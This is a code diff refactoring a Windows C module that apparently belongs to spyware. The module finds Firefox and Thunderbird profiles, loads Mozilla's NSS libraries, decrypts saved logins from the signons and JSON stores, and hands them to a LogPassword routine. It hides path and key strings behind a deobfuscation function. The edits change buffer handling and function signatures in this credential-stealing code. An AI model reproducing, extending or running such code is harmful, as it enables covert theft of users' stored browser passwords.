@@ -1,15 +1,16 @@
-
 #define _CRT_SECURE_NO_WARNINGS 1
-
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-
 #include <windows.h>
-#include <userenv.h>
+
+//#include <stdio.h>
+//#include <stdlib.h>
+//#include <string.h>
+//
+//
+//#include <userenv.h>
 #include "../HM_SafeProcedures.h"
 #include "../demo_functions.h"
 #include "../common.h"
+#include "../strings.h"
 #include <json/JSON.h>
 #include <json/JSONValue.h>
 
@@ -19,7 +20,7 @@
 extern int LogPassword(WCHAR *resource, WCHAR *service, WCHAR *user, WCHAR *pass);
 extern char *LOG_ScrambleName(char *string, BYTE scramble, BOOL crypt);
 extern char *HM_CompletePath(char *file_name, char *buffer);
-extern WCHAR *GetTBLibPath();
+extern WCHAR *GetTBLibPath(WCHAR *, size_t);
 extern char H4_DUMMY_NAME[];
 extern char *GetDosAsciiName(WCHAR *orig_path);
 
@@ -103,10 +104,10 @@ typedef HMODULE (WINAPI *LoadLibrary_t)(char *);
 // Function declarations..
 void NSSUnload();
 int InitFFLibs(WCHAR *firefoxPath);
-int InitializeNSSLibrary(WCHAR *profilePath, char *password);
+int InitializeNSSLibrary(WCHAR *profilePath);
 int DirectoryExists(WCHAR *path);
-WCHAR *GetFFProfilePath();
-WCHAR *GetFFLibPath();
+WCHAR* GetFFProfilePath(WCHAR* FullPath, size_t size);
+WCHAR *GetFFLibPath(WCHAR *, size_t);
 
 int PK11Decrypt(CHAR *decodeData, int decodeLen, WCHAR **clearData, int *finalLen);
 int Base64Decode(char *cryptData, char **decodeData, int *decodeLen);
@@ -230,12 +231,12 @@ void FireFoxInitFunc()
 	BOOL FF_ver_3 = false;
 	WCHAR loadPath[MAX_PATH];
 	char destPath[MAX_PATH];
-	WCHAR *firefoxDir;
+	WCHAR firefoxDir[MAX_PATH] = {};
 
-	firefoxDir = GetFFLibPath();
-	if (!firefoxDir || !DirectoryExists(firefoxDir)) {
-		firefoxDir = GetTBLibPath();
-		if (!firefoxDir || !DirectoryExists(firefoxDir))
+	GetFFLibPath(firefoxDir, MAX_PATH);
+	if (!DirectoryExists(firefoxDir)) {
+		GetTBLibPath(firefoxDir, MAX_PATH);
+		if (!DirectoryExists(firefoxDir))
 			return;
 	}
 
@@ -470,7 +471,6 @@ int InitFFLibs(WCHAR *FFDir)
 	return 1;
 }
 
-
 int InitializeNSSLibrary(WCHAR *profilePath)
 {
 	CHAR szProfile[MAX_PATH];
@@ -496,27 +496,6 @@ void NSSUnload()
 
 	NSSShutdown = NULL;
 }
-
-// La stringa tornata va liberata
-WCHAR *UTF8_2_UTF16(char *str)
-{
-	DWORD wclen;
-	WCHAR *wcstr;
-
-	if ( (wclen = MultiByteToWideChar(CP_UTF8, 0, str, -1, NULL, 0)) == 0 )
-		return NULL;
-
-	if ( !(wcstr = (WCHAR *)malloc(wclen*sizeof(WCHAR))) )
-		return NULL;
-
-	if ( MultiByteToWideChar(CP_UTF8, 0, str, -1, wcstr, wclen) == 0 ) {
-		free(wcstr);
-		return NULL;
-	}
-
-	return wcstr;
-}
-
 
 int DecryptStr(CHAR *cryptData, WCHAR *clearData, UINT clearSize)
 {
@@ -739,9 +718,8 @@ int DumpSqlFF(WCHAR *profilePath, WCHAR *signonFile)
 	return 1;
 }
 
-WCHAR *GetFFLibPath()
+WCHAR *GetFFLibPath(WCHAR *FullPath, size_t size)
 {
-	static WCHAR FullPath[MAX_PATH];
 	char regSubKey[MAX_PATH];
 	char path[MAX_PATH];
 	char *p;
@@ -779,15 +757,14 @@ WCHAR *GetFFLibPath()
 	if (!p)
 		return NULL;
 
-	_snwprintf_s(FullPath, MAX_PATH, L"%S", p);		
+	_snwprintf_s(FullPath, size, _TRUNCATE, L"%S", p);		
 
 	return FullPath;
 }
 
 
-WCHAR *GetFFProfilePath()
+WCHAR *GetFFProfilePath(WCHAR *FullPath, size_t size)
 {
-	static WCHAR FullPath[MAX_PATH];
 	WCHAR appPath[MAX_PATH];
 	WCHAR iniFile[MAX_PATH];
 	WCHAR profilePath[MAX_PATH];
@@ -803,7 +780,7 @@ WCHAR *GetFFProfilePath()
 
 	FNC(GetPrivateProfileStringW)(DeobStringW(L"3E5MZyIj"), L"Path", L"",  profilePath, sizeof(profilePath), iniFile); //"Profile0"
 
-	_snwprintf_s(FullPath, MAX_PATH, DeobStringW(L"%9\\D5OZyyH\\aZEIM5S\\%9"), appPath, profilePath);  //"%s\\Mozilla\\Firefox\\%s"
+	_snwprintf_s(FullPath, size, _TRUNCATE, DeobStringW(L"%9\\D5OZyyH\\aZEIM5S\\%9"), appPath, profilePath);  //"%s\\Mozilla\\Firefox\\%s"
 
 	return FullPath;
 }
@@ -907,7 +884,7 @@ int DumpJsonFF(WCHAR *profilePath, WCHAR *signonFile)
 int DumpFirefox(void)
 {
 	WCHAR *ProfilePath = NULL; 	//Profile path
-	WCHAR *FFDir = NULL;   		//Firefox main installation path
+	WCHAR FFDir[MAX_PATH];   		//Firefox main installation path
 
 	NSSShutdown = NULL;
 	IsNSSInitialized = 0;
@@ -918,9 +895,9 @@ int DumpFirefox(void)
 	if (!ProfilePath || !DirectoryExists(ProfilePath)) 
 		return 0;
 	
-	FFDir = GetFFLibPath();
+	GetFFLibPath(FFDir, MAX_PATH);
 
-	if (!FFDir || !DirectoryExists(FFDir)) 
+	if (!DirectoryExists(FFDir)) 
 		return 0;
 	
 	if (!InitFFLibs(FFDir))	
